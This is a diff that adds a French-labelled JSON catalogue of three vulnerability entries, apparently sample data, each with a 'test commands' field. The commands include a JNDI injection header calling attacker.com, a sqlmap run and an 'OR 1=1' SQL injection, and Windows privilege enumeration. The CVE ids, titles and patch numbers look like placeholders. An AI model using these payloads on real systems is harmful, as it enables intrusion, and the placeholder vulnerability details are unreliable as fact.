@@ -1,0 +1,55 @@
+[
+  {
+    "id": 1,
+    "cve": "CVE-2024-1234",
+    "titre": "Remote Code Execution in Log4j",
+    "description": "Vulnérabilité critique permettant l'exécution de code arbitraire",
+    "severite": "Critique",
+    "score_cvss": 9.8,
+    "plateforme": ["Linux", "Windows"],
+    "date_decouverte": "2024-01-15",
+    "date_correction": "2024-02-01",
+    "commandes_test": [
+      "curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' http://target.com"
+    ],
+    "mitigation": "Mettre à jour Log4j vers la version 2.17.0+",
+    "ressources": ["https://nvd.nist.gov/vuln/detail/CVE-2024-1234"],
+    "tools": ["metasploit", "nessus"]
+  },
+  {
+    "id": 2,
+    "cve": "CVE-2024-5678",
+    "titre": "SQL Injection in WordPress Plugin",
+    "description": "Injection SQL dans un plugin WordPress populaire",
+    "severite": "Haute",
+    "score_cvss": 8.5,
+    "plateforme": ["Linux"],
+    "date_decouverte": "2024-03-10",
+    "date_correction": "2024-04-01",
+    "commandes_test": [
+      "sqlmap -u 'http://site.com/plugin?id=1' --dbs",
+      "curl -G 'http://site.com/plugin' --data-urlencode 'id=1 OR 1=1'"
+    ],
+    "mitigation": "Mettre à jour le plugin vers la dernière version",
+    "ressources": ["https://www.exploit-db.com/"],
+    "tools": ["sqlmap", "burpsuite"]
+  },
+  {
+    "id": 3,
+    "cve": "CVE-2024-9012",
+    "titre": "Privilege Escalation in Windows",
+    "description": "Escalade de privilèges via une faille du noyau Windows",
+    "severite": "Haute",
+    "score_cvss": 7.8,
+    "plateforme": ["Windows"],
+    "date_decouverte": "2024-05-20",
+    "date_correction": "2024-06-15",
+    "commandes_test": [
+      "whoami /priv",
+      "PowerShell -Command \"Get-Process -IncludeUserName | Where-Object {$_.UserName -ne $null}\""
+    ],
+    "mitigation": "Installer les patches Windows KB12345678",
+    "ressources": ["https://msrc.microsoft.com/"],
+    "tools": ["metasploit", "winpeas"]
+  }
+]
